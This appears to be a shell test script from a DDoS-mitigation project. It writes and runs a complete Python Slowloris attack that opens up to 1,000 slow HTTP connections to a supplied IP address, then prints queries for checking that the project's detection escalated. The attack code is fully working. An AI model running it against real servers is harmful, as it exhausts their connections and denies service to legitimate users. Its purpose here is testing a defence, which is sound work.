#!/bin/bash
# Layer 7 Test: Slowloris/CPS Spike Attack
# Opens many slow HTTP connections to exhaust connection state
# Expected: Challenge level escalates to 2-3 (CPS_SPIKE or STATE_EXHAUSTION)

TARGET_IP=$1
TARGET_PORT=${2:-7080}
CONNECTIONS=${3:-1000}
DURATION=${4:-120}

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <target_eip> [port] [connections] [duration_seconds]"
    echo ""
    echo "Example: $0 203.0.113.10 7080 1000 120"  # Use your target EIP
    echo "  - Opens 1000 slow HTTP connections"
    echo "  - Runs for 120 seconds"
    echo "  - Expected: CPS spike detected, challenge level → 2"
    exit 1
fi

echo "[SLOWLORIS TEST] Launching connection exhaustion attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Connections: ${CONNECTIONS}"
echo "Duration: ${DURATION}s"
echo "Expected: CPS spike detection, challenge level escalates to 2-3"
echo ""

# Create temporary Python script for slowloris attack
cat > /tmp/slowloris_attack.py << 'PYEOF'
#!/usr/bin/env python3
import socket
import sys
import time
import random
import threading

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
num_connections = int(sys.argv[3])
duration = int(sys.argv[4])

sockets = []
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

def open_connection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, target_port))

        # Send partial HTTP request
        s.send(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n".encode())
        s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
        s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode())

        sockets.append(s)
        return True
    except:
        return False

print(f"[Slowloris] Opening {num_connections} connections to {target_ip}:{target_port}")
start_time = time.time()

# Open connections
opened = 0
for i in range(num_connections):
    if open_connection():
        opened += 1
    if (i + 1) % 100 == 0:
        print(f"  Opened {i+1}/{num_connections} connections...")

print(f"[Slowloris] {opened} connections established")
print(f"[Slowloris] Keeping connections alive for {duration}s...")

# Keep connections alive by sending partial headers
end_time = time.time() + duration
iteration = 0
while time.time() < end_time:
    for s in sockets[:]:
        try:
            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
        except:
            sockets.remove(s)

    iteration += 1
    if iteration % 10 == 0:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        print(f"  T+{elapsed}s: {len(sockets)} connections alive, {remaining}s remaining")

    time.sleep(3)

# Close all sockets
for s in sockets:
    try:
        s.close()
    except:
        pass

print(f"[Slowloris] Attack complete, closed {len(sockets)} connections")
PYEOF

chmod +x /tmp/slowloris_attack.py

# Run the attack
python3 /tmp/slowloris_attack.py $TARGET_IP $TARGET_PORT $CONNECTIONS $DURATION

echo ""
echo "[SLOWLORIS TEST] Attack complete"
echo ""
echo "Verification steps:"
echo "  1. Check attack_events table:"
echo "     SELECT * FROM attack_events WHERE attack_type IN ('CPS_SPIKE', 'STATE_EXHAUSTION') ORDER BY detected_at DESC LIMIT 1;"
echo "  2. Check anomaly_detection_state:"
echo "     SELECT origin_id, cps_breach_count, state_exhaust_breach_count, current_challenge_level FROM anomaly_detection_state;"
echo "  3. Check active connections (should be elevated):"
echo "     curl http://localhost:8000/api/v1/origins/O1/metrics/latest | jq .metric.active_connections"
echo "  4. Check CPS rate:"
echo "     curl http://localhost:8000/api/v1/origins/O1/metrics/latest | jq .metric.cps"
echo ""

# Cleanup
rm -f /tmp/slowloris_attack.py
